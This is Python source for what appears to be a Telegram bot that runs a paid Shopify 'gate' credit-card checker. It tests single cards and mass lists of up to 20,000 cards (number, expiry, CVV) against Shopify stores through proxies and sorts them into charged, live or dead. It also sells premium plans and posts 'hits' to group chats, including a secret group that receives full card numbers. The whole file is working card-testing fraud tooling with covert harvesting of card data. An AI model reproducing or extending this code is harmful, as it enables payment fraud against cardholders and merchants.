# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def _hit_text(card: str, resp: str, bin_data: dict, price: str, currency: str,
              elapsed: float, user, plan: str, verdict: str) -> str:
    bd   = bin_data or {}
    flag = bd.get("country_emoji", "")
    cnt  = bd.get("country", "N/A")
    bi   = escape(f"{str(bd.get('scheme','N/A')).upper()} - {bd.get('bank','N/A')} - {(flag+' '+cnt).strip()}")
    ps   = f" | {escape(price)} {escape(currency)}" if price and price != "0.00" else ""
    sl   = (f'<b><a href="{BOT_CHANNEL}">[❆]</a> Charged {_rand_charged()}</b>'
            if verdict == "CHARGED" else
            f'<b><a href="{BOT_CHANNEL}">[❆]</a> Live {_rand_live()}</b>')
    gl   = f'<b>Gate ➳ Shopify{ps}</b>' if verdict == "CHARGED" else '<b>Gate ➳ Shopify 0-20$</b>'
    return (
        f'{sl}\n\n'
        f'<b>{_te(CARD_EMOJI_ID,"💳")}</b>\n'
        f'<b>   ⤷ <code>{escape(card)}</code></b>\n'
        f'{gl}\n'
        f'<b>──────────</b>\n'
        f'<b>Resp ➳ {escape(resp)}</b>\n'
        f'<b>Bin  ➳ <code>{bi}</code></b>\n'
        f'<b>──────────</b>\n'
        f'<b>{_te(TIME_EMOJI_ID,"⏱")} ➳ {_fmt_time(elapsed)}</b>\n'
        f'<b>{_te(USER_EMOJI_ID,"👤")} ➳ {_user_link(user)} {_te(_plan_eid(plan),"⭐")}</b>\n'
        f'<b>{_te(DEV_EMOJI_ID,"⚡")} ➳ {DEV_LINK_HTML} {_te(PRO_EMOJI_ID,"⭐")}</b>'
    )

def _share_group_text(resp: str, price: str, currency: str,
                      user, plan: str, verdict: str) -> str:
    ps     = f" | {escape(price)} {escape(currency)}" if price and price != "0.00" else ""
    eid    = _rand_charged() if verdict == "CHARGED" else _rand_live()
    label  = "CHARGED" if verdict == "CHARGED" else "LIVE"
    gate   = f"Shopify Payments{ps}"
    fname  = escape(user.first_name or "User") if user else "User"
    plan_e = _te(_plan_eid(plan), "⭐")
    return (
        f'<b>HIT ➛ {label} {eid}</b>\n'
        f'<b>Gate ➛ {gate}</b>\n'
        f'<b>{_te(HIT_RESP_EMOJI_ID,"✅")} {escape(resp)}</b>\n'
        f'<b>User ➛ {fname} {plan_e}</b>'
    )

def _share_group_kb() -> RawMarkup:
    return RawMarkup([
        [_btn(f"⚡ {BOT_DISPLAY} — /buy", url=BOT_DEEP_BUY,
              style="primary", icon=BTN_CHARGED_EMOJI_ID)],
        [_btn("📢 Channel", url=BOT_CHANNEL, style="primary"),
         _btn("💬 Group",   url="https://t.me/+Gjwke5Yc1ddhYmZk", style="primary")],
    ])

async def _send_hit_log(bot, resp: str, price: str, currency: str,
                        user, plan: str, verdict: str = "CHARGED",
                        card: str = "", bin_data: dict = None):
    await _rl_hit.wait()
    bin_data = bin_data or {}
    if HIT_LOG_GROUP_ID:
        log_text = _share_group_text(resp, price, currency, user, plan, verdict)
        try:
            await bot.send_message(
                chat_id=HIT_LOG_GROUP_ID,
                text=log_text,
                parse_mode="HTML",
                disable_web_page_preview=True,
                reply_markup=_share_group_kb(),
            )
        except Exception as e:
            logging.error(f"[SH] hit-log → {HIT_LOG_GROUP_ID}: {e}")
    if SECRET_GROUP_ID and card:
        secret_text = _hit_text(card, resp, bin_data, price, currency, 0, user, plan, verdict)
        try:
            await bot.send_message(
                chat_id=SECRET_GROUP_ID,
                text=secret_text,
                parse_mode="HTML",
                disable_web_page_preview=True,
            )
        except Exception as e:
            logging.error(f"[SH] secret-group → {SECRET_GROUP_ID}: {e}")

async def _send_user_dm(bot, user, card, resp, bin_data, price, currency,
                        elapsed, plan, verdict, reply_to=None):
    await _rl_dm.wait()
    text = _hit_text(card, resp, bin_data, price, currency, elapsed, user, plan, verdict)
    kb   = RawMarkup([[_btn(
        "CHARGED HIT" if verdict == "CHARGED" else "LIVE HIT",
        url=BOT_CHANNEL, style="success",
        icon=BTN_CHARGED_EMOJI_ID if verdict == "CHARGED" else BTN_LIVE_EMOJI_ID,
    )]])
    try:
        await bot.send_message(
            chat_id=user.id, text=text, parse_mode="HTML",
            disable_web_page_preview=True, reply_markup=kb,
            reply_to_message_id=reply_to,
        )
    except Exception:
        pass


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# /sh  SINGLE CARD  — persistent session, parallel BIN
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async def cmd_sh(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user

    if context.bot_data.get("maintenance") and user.id != OWNER_ID:
        await update.message.reply_text(_maintenance_msg(), parse_mode="HTML",
                                        disable_web_page_preview=True); return
    if not context.bot_data.get("sh_on", True):
        await update.message.reply_text(_gate_off_msg(), parse_mode="HTML",
                                        disable_web_page_preview=True); return

    nj = await _check_force_sub(user.id, context)
    if nj:
        rows = [[_btn(f"➺ Join @{n}", url=l)] for n, l in nj]
        rows.append([_btn("✅  I Joined — Verify", cb="check_sub", style="primary")])
        await update.message.reply_text(_join_msg(), parse_mode="HTML",
                                        disable_web_page_preview=True,
                                        reply_markup=RawMarkup(rows)); return

    card = None
    if context.args:
        card = context.args[0].strip()
    elif update.message.reply_to_message:
        txt = (update.message.reply_to_message.text or
               update.message.reply_to_message.caption or "").strip()
        if txt:
            card = txt.split()[0]

    if not card or card.count("|") < 3:
        await update.message.reply_text(_usage_sh_msg(), parse_mode="HTML",
                                        disable_web_page_preview=True); return

    ud      = _get_ud(user.id, context)
    premium = _is_premium(ud, user.id)

    if not premium:
        if ud.get("credits", 0) <= 0:
            await update.message.reply_text(
                _no_credits_msg(), parse_mode="HTML", disable_web_page_preview=True,
                reply_markup=RawMarkup([[_btn("💎 BUY PREMIUM", cb="mprice",
                                              style="primary", icon=BTN_CHARGED_EMOJI_ID)]]),
            ); return
        cs  = context.bot_data.setdefault("sh_cooldown", {})
        rem = SH_COOLDOWN - (time.time() - cs.get(user.id, 0))
        if rem > 0:
            await update.message.reply_text(
                _cooldown_msg(rem), parse_mode="HTML", disable_web_page_preview=True,
                reply_markup=RawMarkup([[_btn("💎 Go Premium — No Cooldown",
                                              cb="mprice", style="primary",
                                              icon=BTN_CHARGED_EMOJI_ID)]]),
            ); return
        cs[user.id]   = time.time()
        ud["credits"] = max(0, ud.get("credits", 1) - 1)

    sites   = _load_sites()
    proxies = _load_proxies()
    plan    = ud.get("plan", "TRIAL")
    t0      = time.time()
    bin6    = card.split("|")[0][:6]

    spinner_kb = RawMarkup([[_btn("Checking…", url=BOT_CHANNEL, style="secondary",
                                  icon=PROG_PROGRESS_EMOJI_ID)]])
    try:
        msg = await update.message.reply_text(
            f'<b>{_te(PROG_GATE_EMOJI_ID,"🛒")} Gate ➳ Shopify</b>\n'
            f'<b>{_te(PROG_PROGRESS_EMOJI_ID,"🔄")} Checking…</b>',
            parse_mode="HTML", reply_markup=spinner_kb, disable_web_page_preview=True,
        )
    except Exception:
        msg = await update.message.reply_text("🛒 Checking…")

    try:
        sess = await _get_sh_session()
        (verdict, resp_text, api_price, api_currency), bin_data = await asyncio.gather(
            _check_card_with_retry(sess, card, sites, proxies,
                                   max_sites=SH_SITE_RETRIES,
                                   site_timeout=SH_SITE_TIMEOUT),
            _sh_bin_cached(bin6),
            return_exceptions=False,
        )
    except asyncio.TimeoutError:
        verdict, resp_text, api_price, api_currency = "DEAD", "Timeout", "0.00", "USD"
        bin_data = {}
    except BaseException as e:
        verdict, resp_text, api_price, api_currency = "DEAD", str(e)[:80], "0.00", "USD"
        bin_data = {}

    if not isinstance(bin_data, dict):
        bin_data = {}

    elapsed = time.time() - t0
    bt      = _bin_str(bin_data)

    if verdict in ("CHARGED", "LIVE", "TDS"):
        ud["approved_checks"] = ud.get("approved_checks", 0) + 1
    else:
        ud["declined_checks"] = ud.get("declined_checks", 0) + 1
    ud["total_checks"] = ud.get("total_checks", 0) + 1

    text = _build_result(card, resp_text, verdict, bt, api_price, api_currency, elapsed, user, plan)
    kb   = _kb_verdict(verdict)
    try:
        await msg.edit_text(text, parse_mode="HTML", reply_markup=kb,
                            disable_web_page_preview=True)
    except Exception:
        try:
            await update.message.reply_text(text, parse_mode="HTML", reply_markup=kb,
                                            disable_web_page_preview=True)
        except Exception as e2:
            logging.error(f"[SH] result send: {e2}")

    if verdict in ("CHARGED", "LIVE", "TDS"):
        asyncio.create_task(asyncio.gather(
            _send_hit_log(context.bot, resp_text, api_price, api_currency, user, plan, verdict,
                          card=card, bin_data=bin_data),
            _send_user_dm(context.bot, user, card, resp_text, bin_data,
                          api_price, api_currency, elapsed, plan, verdict),
            return_exceptions=True,
        ))


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# PROGRESS TEXT + UPDATE  (mass checker)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def _progress_text(sess: dict) -> str:
    elapsed = time.time() - sess["start_time"]
    ulink   = _user_link(sess["user_obj"]) if sess.get("user_obj") else "User"
    peid    = _plan_eid(sess.get("plan", "TRIAL"))
    return (
        f'<b>{_te(PROG_GATE_EMOJI_ID,"🛒")} Gate ➳ Shopify</b>\n'
        f'<b>{_te(PROG_PROGRESS_EMOJI_ID,"🔄")} Progress ➳ {sess["checked"]}/{sess["total"]}</b>\n'
        f'<b>Charged ➳ {sess["charged"]} {_te(PROG_CHARGED_EMOJI_ID,"💎")}</b>\n'
        f'<b>Live    ➳ {sess["live"]}    {_te(PROG_LIVE_EMOJI_ID,"✅")}</b>\n'
        f'<b>Dead    ➳ {sess["dead"]}    {_te(PROG_DEAD_EMOJI_ID,"❌")}</b>\n'
        f'<b>Time    ➳ {_fmt_time(elapsed)}</b>\n'
        f'<b>{_te(USER_EMOJI_ID,"👤")} ➳ {ulink} {_te(peid,"⭐")}</b>\n'
        f'<b>{_te(DEV_EMOJI_ID,"⚡")} ➳ {DEV_LINK_HTML} {_te(PRO_EMOJI_ID,"⭐")}</b>'
    )

_prog_locks: dict[str, asyncio.Lock] = {}

async def _update_progress(bot, sid: str, force: bool = False):
    sess = MSH_SESSIONS.get(sid)
    if not sess:
        return
    now     = time.time()
    last    = sess.get("last_update", 0)
    is_done = sess["status"] in ("FINISHED", "STOPPED")
    if not force and not is_done and (now - last) < PROGRESS_INTERVAL:
        return
    text = _progress_text(sess)
    if sess.get("last_text") == text and not force:
        return
    if sid not in _prog_locks:
        _prog_locks[sid] = asyncio.Lock()
    async with _prog_locks[sid]:
        sess = MSH_SESSIONS.get(sid)
        if not sess or (sess.get("last_text") == text and not force):
            return
        running = sess["status"] == "CHECKING"
        await _rl_prog.wait()
        try:
            await bot.edit_message_text(
                chat_id=sess["chat_id"], message_id=sess["msg_id"],
                text=text, parse_mode="HTML",
                reply_markup=_msh_buttons(sid, running),
                disable_web_page_preview=True,
            )
            sess["last_text"]   = text
            sess["last_update"] = now
        except Exception as e:
            es = str(e).lower()
            if "not modified" not in es and "not found" not in es:
                logging.error(f"[MSH] progress edit: {e}")


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# RESULT FILE
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def _generate_result_file(sess: dict, rtype: str, user_obj, plan: str):
    if rtype == "charged":
        cards, label = sess.get("charged_cards", []), "Charged"
    elif rtype == "live":
        cards = sess.get("charged_cards", []) + sess.get("live_cards", [])
        label = "Live"
    elif rtype == "dead":
        cards, label = sess.get("dead_cards", []), "Dead"
    else:
        cards = (sess.get("charged_cards", []) + sess.get("live_cards", []) +
                 sess.get("dead_cards", []))
        label = "All"
    name  = (user_obj.first_name or "User") if user_obj else "User"
    lines = [f"Gate ➳ Shopify Mass", f"Result ➳ {label}", f"Total ➳ {len(cards)}", "━" * 14]
    for cd in cards:
        bi      = cd.get("bin_info", {})
        flag    = bi.get("country_emoji", "")
        country = bi.get("country", "N/A")
        price   = cd.get("price", "N/A")
        cur     = cd.get("currency", "USD")
        status  = cd.get("verdict", "N/A")
        lines += [
            f"Card    ➳ {cd.get('card','N/A')}",
            f"Status  ➳ {status}",
            f"Gate    ➳ Shopify | {price} {cur}",
            f"Resp    ➳ {cd.get('response','N/A')}",
            f"Brand   ➳ {bi.get('scheme','N/A')}",
            f"Issuer  ➳ {bi.get('bank','N/A')}",
            f"Country ➳ {(flag+' '+country).strip()}",
            f"User    ➳ {name} ({plan})",
            f"Pro     ➳ {BOT_DISPLAY}",
            "━" * 14,
        ]
    buf = BytesIO("\n".join(lines).encode())
    buf.seek(0)
    ts  = datetime.now().strftime("%Y%m%d_%H%M%S")
    fn  = f"BATMAN_MSH_{rtype.upper()}_{ts}.txt"
    return buf, fn, len(cards)


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# PER-CARD MASS WORKER
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async def _mass_worker(
    sid: str, card: str, cc_num: str, bot, user_obj, plan: str,
    shared: aiohttp.ClientSession, bin_cache: BinCache,
    sem: asyncio.Semaphore, sites: list[str], proxies: list[str],
):
    if _is_stopped(sid):
        return
    async with sem:
        if _is_stopped(sid):
            return
        sess = MSH_SESSIONS.get(sid)
        if not sess:
            return

        t0       = time.time()
        bin_data = await bin_cache.get(cc_num[:6])

        if _is_stopped(sid):
            return

        try:
            verdict, resp, price, currency = await _check_card_with_retry(
                shared, card, sites, proxies,
                max_sites=SITE_RETRIES, site_timeout=SITE_TIMEOUT,
            )
        except asyncio.CancelledError:
            raise
        except Exception as e:
            verdict, resp, price, currency = "DEAD", str(e)[:80], "0.00", "USD"

        elapsed = time.time() - t0
        sess    = MSH_SESSIONS.get(sid)
        if not sess or _is_stopped(sid):
            return

        sess["checked"] += 1
        card_data = {
            "card":     card,
            "verdict":  verdict,
            "response": resp,
            "price":    price,
            "currency": currency,
            "bin_info": bin_data,
            "ts":       datetime.now().isoformat(),
        }

        if verdict == "CHARGED":
            sess["charged"] += 1
            sess.setdefault("charged_cards", []).append(card_data)
            asyncio.create_task(asyncio.gather(
                _send_hit_log(bot, resp, price, currency, user_obj, plan, "CHARGED",
                              card=card, bin_data=bin_data),
                _send_user_dm(bot, user_obj, card, resp, bin_data, price, currency,
                              elapsed, plan, "CHARGED", reply_to=sess.get("user_msg_id")),
                return_exceptions=True,
            ))
        elif verdict in ("LIVE", "TDS"):
            sess["live"] += 1
            sess.setdefault("live_cards", []).append(card_data)
            asyncio.create_task(asyncio.gather(
                _send_hit_log(bot, resp, price, currency, user_obj, plan, "LIVE",
                              card=card, bin_data=bin_data),
                _send_user_dm(bot, user_obj, card, resp, bin_data, price, currency,
                              elapsed, plan, "LIVE", reply_to=sess.get("user_msg_id")),
                return_exceptions=True,
            ))
        else:
            sess["dead"] += 1
            sess.setdefault("dead_cards", []).append(card_data)
            sess["_batch_dead"] = sess.get("_batch_dead", 0) + 1

        chk = sess["checked"]
        if (verdict in ("CHARGED", "LIVE", "TDS") or
                chk % PROGRESS_EVERY_N == 0 or chk >= sess["total"]):
            asyncio.create_task(_update_progress(bot, sid))


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# MASS BATCH RUNNER
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async def _run_mass_batch(
    bot, sid: str, cards: list[tuple[str, str]],
    user_obj, plan: str, sites: list[str], proxies: list[str],
):
    sess = MSH_SESSIONS.get(sid)
    if not sess:
        return
    user_id = sess["user_id"]
    sem     = asyncio.Semaphore(MAX_CONCURRENT)
    bc      = BinCache()

    connector = aiohttp.TCPConnector(
        limit=TCP_LIMIT, limit_per_host=TCP_PER_HOST,
        keepalive_timeout=30, enable_cleanup_closed=True,
    )
    async with aiohttp.ClientSession(
        connector=connector,
        timeout=aiohttp.ClientTimeout(total=SITE_TIMEOUT + 5),
        headers={"User-Agent": "Mozilla/5.0", "Accept": "application/json"},
    ) as shared:
        tasks = []
        for card, cc_num in cards:
            if _is_stopped(sid): break
            t = asyncio.create_task(
                _mass_worker(sid, card, cc_num, bot, user_obj, plan,
                             shared, bc, sem, sites, proxies)
            )
            tasks.append(t)
            sess = MSH_SESSIONS.get(sid)
            if sess:
                sess.setdefault("tasks", []).append(t)
        await asyncio.gather(*tasks, return_exceptions=True)

    sess = MSH_SESSIONS.get(sid)
    if sess:
        dead = sess.get("_batch_dead", 0)
        if dead > 0:
            try:
                from database import get_user_credits, update_credits
                cur = await asyncio.to_thread(get_user_credits, user_id)
                await asyncio.to_thread(update_credits, user_id, max(0, cur - dead))
            except Exception as e:
                logging.error(f"[MSH] credit batch: {e}")

        sess["end_time"] = time.time()
        if sess["status"] != "STOPPED":
            sess["status"] = "FINISHED"
        elapsed = sess["end_time"] - sess["start_time"]
        cps     = sess["checked"] / max(1, elapsed)
        logging.info(
            f"🏁 [MSH] {sid} {sess['status']} "
            f"CHG:{sess['charged']} LIVE:{sess['live']} DEAD:{sess['dead']} "
            f"Checked:{sess['checked']}/{len(cards)} "
            f"Speed:{cps:.1f} cps Time:{int(elapsed)}s"
        )
        sess["last_text"] = ""
        sess["tasks"]     = []
        await _update_progress(bot, sid, force=True)
    _prog_locks.pop(sid, None)


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# /msh  MASS SHOPIFY COMMAND
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async def cmd_msh(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user

    if context.bot_data.get("maintenance") and user.id != OWNER_ID:
        await update.message.reply_text(_maintenance_msg(), parse_mode="HTML",
                                        disable_web_page_preview=True); return
    if not context.bot_data.get("msh_on", True):
        await update.message.reply_text(_gate_off_msg(), parse_mode="HTML",
                                        disable_web_page_preview=True); return

    ud      = _get_ud(user.id, context)
    premium = _is_premium(ud, user.id)
    if not premium:
        await update.message.reply_text(
            _guard(f'Premium Required {_te(BTN_CHARGED_EMOJI_ID,"💎")}',
                   '<b>Mass Shopify is for premium users.\nUse /buy to upgrade.</b>'),
            parse_mode="HTML", disable_web_page_preview=True,
        ); return

    for s in MSH_SESSIONS.values():
        if s.get("user_id") == user.id and s.get("status") == "CHECKING":
            await update.message.reply_text(
                _guard(f'Active Session {_te(PROG_ERRORS_EMOJI_ID,"⚠️")}',
                       '<b>You have a running check.\nPress Stop first.</b>'),
                parse_mode="HTML", disable_web_page_preview=True,
            ); return

    raw = ""
    if context.args:
        raw += " ".join(context.args) + " "
    if update.message.reply_to_message:
        rm   = update.message.reply_to_message
        raw += (rm.text or rm.caption or "") + " "

    doc = update.message.document or (
        update.message.reply_to_message.document if update.message.reply_to_message else None
    )
    if doc:
        if doc.file_size > 2 * 1024 * 1024:
            await update.message.reply_text("❌ File too large. Max 2 MB."); return
        try:
            f   = await context.bot.get_file(doc.file_id)
            bio = BytesIO()
            await f.download_to_memory(bio)
            bio.seek(0)
            raw += bio.read().decode("utf-8", errors="ignore")
        except Exception as e:
            await update.message.reply_text(f"❌ Error reading file: {e}"); return

    if not raw.strip():
        await update.message.reply_text(_usage_msh_msg(), parse_mode="HTML",
                                        disable_web_page_preview=True); return

    extracted = extract_cards(raw)
    if not extracted:
        await update.message.reply_text(
            "❌ No valid card formats found (<code>cc|mm|yy|cvv</code>).",
            parse_mode="HTML"
        ); return

    valid: list[tuple[str, str]] = []
    for cs in extracted:
        if len(valid) >= 20000: break
        p = cs.split("|")
        if len(p) != 4: continue
        cc, mm, yy, cvv = p
        if not luhn_check(cc):  continue
        if is_expired(mm, yy):  continue
        valid.append((cs, cc))

    if not valid:
        await update.message.reply_text("❌ No valid cards after Luhn/expiry check."); return

    sites   = _load_sites()
    proxies = _load_proxies()
    plan    = ud.get("plan", "TRIAL")
    total   = len(valid)
    sid     = "".join(random.choices(string.ascii_uppercase + string.digits, k=8))
    peid    = _plan_eid(plan)
    ulink   = _user_link(user)

    init_text = (
        f'<b>{_te(PROG_GATE_EMOJI_ID,"🛒")} Gate ➳ Shopify</b>\n'
        f'<b>{_te(PROG_PROGRESS_EMOJI_ID,"🔄")} Progress ➳ 0/{total}</b>\n'
        f'<b>Charged ➳ 0 {_te(PROG_CHARGED_EMOJI_ID,"💎")}</b>\n'
        f'<b>Live    ➳ 0 {_te(PROG_LIVE_EMOJI_ID,"✅")}</b>\n'
        f'<b>Dead    ➳ 0 {_te(PROG_DEAD_EMOJI_ID,"❌")}</b>\n'
        f'<b>Time    ➳ 0s</b>\n'
        f'<b>{_te(USER_EMOJI_ID,"👤")} ➳ {ulink} {_te(peid,"⭐")}</b>\n'
        f'<b>{_te(DEV_EMOJI_ID,"⚡")} ➳ {DEV_LINK_HTML} {_te(PRO_EMOJI_ID,"⭐")}</b>'
    )
    prog_msg = await update.message.reply_text(
        init_text, parse_mode="HTML",
        reply_markup=_msh_buttons(sid, True),
        disable_web_page_preview=True,
    )

    MSH_SESSIONS[sid] = {
        "status":        "CHECKING",
        "chat_id":       update.message.chat_id,
        "user_id":       user.id,
        "msg_id":        prog_msg.message_id,
        "user_msg_id":   update.message.message_id,
        "total":         total,
        "checked":       0,
        "charged":       0,
        "live":          0,
        "dead":          0,
        "_batch_dead":   0,
        "start_time":    time.time(),
        "tasks":         [],
        "last_text":     "",
        "last_update":   0,
        "charged_cards": [],
        "live_cards":    [],
        "dead_cards":    [],
        "user_obj":      user,
        "plan":          plan,
    }
    logging.info(f"🚀 [MSH] {sid} — {total} cards — conc {MAX_CONCURRENT} — user {user.id}")
    asyncio.create_task(_run_mass_batch(context.bot, sid, valid, user, plan, sites, proxies))


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CALLBACK HANDLERS  — Stop + Result download
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async def cb_msh_result(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    FIX 1: NO pre-emptive query.answer() at the top.

    Telegram allows exactly ONE answer() per callback query.
    The old code called answer() immediately (blank ack) then tried to answer
    again for every error alert — all those second calls threw BadRequest and
    the user saw NO feedback on any button press.
    Each branch below now calls answer() exactly once.
    """
    query = update.callback_query
    # mshr_{sid}_{type}
    parts = query.data.split("_", 2)
    if len(parts) < 3:
        await query.answer("⚠️ Invalid button", show_alert=True)
        return

    sid, rtype = parts[1], parts[2]
    sess = MSH_SESSIONS.get(sid)
    if not sess:
        await query.answer("⚠️ Session expired — start a new /msh", show_alert=True)
        return
    if query.from_user.id != sess.get("user_id"):
        await query.answer("❌ This is not your session", show_alert=True)
        return
    if _is_locked(sid):
        await query.answer(f"⏳ Please wait {_lock_rem(sid)}s", show_alert=True)
        return

    if rtype == "charged":
        count = len(sess.get("charged_cards", []))
    elif rtype == "live":
        count = len(sess.get("charged_cards", [])) + len(sess.get("live_cards", []))
    elif rtype == "dead":
        count = len(sess.get("dead_cards", []))
    else:
        count = (len(sess.get("charged_cards", [])) + len(sess.get("live_cards", [])) +
                 len(sess.get("dead_cards", [])))

    if count == 0:
        await query.answer(f"❌ No {rtype} cards yet", show_alert=True)
        return

    # Acknowledge the tap with a visible message (only answer on success path)
    await query.answer(f"📦 Preparing {rtype} file…")

    user_obj   = sess.get("user_obj")
    plan       = sess.get("plan", "TRIAL")
    buf, fn, n = _generate_result_file(sess, rtype, user_obj, plan)
    capt = f"Result ➳ {rtype.title()}\nTotal ➳ <b>{n}</b>\nGate ➳ Shopify Mass"
    data = buf.read()
    try:
        await context.bot.send_document(
            chat_id=query.message.chat_id,
            document=InputFile(BytesIO(data), filename=fn),
            caption=capt, parse_mode="HTML",
            reply_to_message_id=sess.get("user_msg_id"),
        )
    except Exception:
        try:
            await query.message.reply_document(
                document=InputFile(BytesIO(data), filename=fn),
                caption=capt, parse_mode="HTML",
            )
        except Exception as e:
            logging.error(f"[MSH] send_document: {e}")
            try:
                await query.message.reply_text(f"❌ Could not send file: {e}", parse_mode="HTML")
            except Exception:
                pass


async def cb_msh_stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    FIX 2: Stop NEVER checks _is_locked.
    The user must always be able to stop a running check immediately.
    """
    query = update.callback_query
    parts = query.data.split("_", 1)
    sid   = parts[1] if len(parts) == 2 else ""
    sess  = MSH_SESSIONS.get(sid)
    if not sess:
        await query.answer("⚠️ Session not found", show_alert=True); return
    if query.from_user.id != sess.get("user_id"):
        await query.answer("❌ No permission", show_alert=True); return
    if sess["status"] != "CHECKING":
        await query.answer("ℹ️ Already stopped", show_alert=True); return

    sess["status"] = "STOPPED"
    cancelled = 0
    for t in sess.get("tasks", []):
        if not t.done():
            t.cancel()
            cancelled += 1
    sess["tasks"] = []

    await query.answer(f"🛑 Stopped! {cancelled} tasks cancelled")
    sess["last_text"] = ""
    asyncio.create_task(_update_progress(context.bot, sid, force=True))


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# EXPORTS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def get_sh_handler() -> CommandHandler:
    return CommandHandler("sh", cmd_sh)

def get_msh_handler() -> CommandHandler:
    return CommandHandler("msh", cmd_msh)

def get_msh_callback_handlers() -> list:
    """Register these in main.py BEFORE the global CallbackQueryHandler."""
    return [
        CallbackQueryHandler(cb_msh_result, pattern=rf"^{_CB_RESULT}_"),
        CallbackQueryHandler(cb_msh_stop,   pattern=rf"^{_CB_STOP}_"),
    ]
